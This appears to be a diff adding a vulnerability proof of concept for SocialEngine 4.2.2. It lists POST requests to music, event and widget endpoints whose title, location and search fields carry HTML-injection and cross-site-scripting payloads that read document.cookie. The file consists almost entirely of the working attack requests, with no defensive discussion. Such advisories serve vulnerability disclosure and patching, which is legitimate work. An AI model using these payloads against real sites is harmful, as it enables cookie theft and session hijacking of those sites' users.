@@ -1,0 +1,25 @@
+HTML-injection
+
+POST http://www.example.com/index.php/music/create
+
+POST data without form-data enctype:
+title=<script>alert(document.cookie);</script>&description=teste
+&search=1&auth_view=everyone&MAX_FILE_SIZE=8388608&filename=
+&fancyuploadfileids=15
+
+POST
+http://www.example.com/socialengine/socialengine422_trial/index.php/events/create
+
+POST data without form-data enctype:
+title=teste XSS 3&description=teste XSS 3&starttime[date]=4/9/2012&
+starttime[hour]=1&starttime[minute]=0&starttime[ampm]=AM&endtime[date]=4/12/2012
+&endtime[hour]=1&endtime[minute]=0&endtime[ampm]=AM&host=teste
+&location=<script>alert(document.cookie);</script>&MAX_FILE_SIZE=8388608&
+photo=&category_id=0&search=&search=1&approval=&auth_invite=&auth_invite=1&
+auth_view=everyone&auth_comment=everyone&auth_photo=everyone&submit=
+
+Cross-site-scripting
+
+POST http://www.example.com/index.php/widget/index/content_id/644
+
+format=html&subject=event_1&search=';alert(document.cookie);var a = '
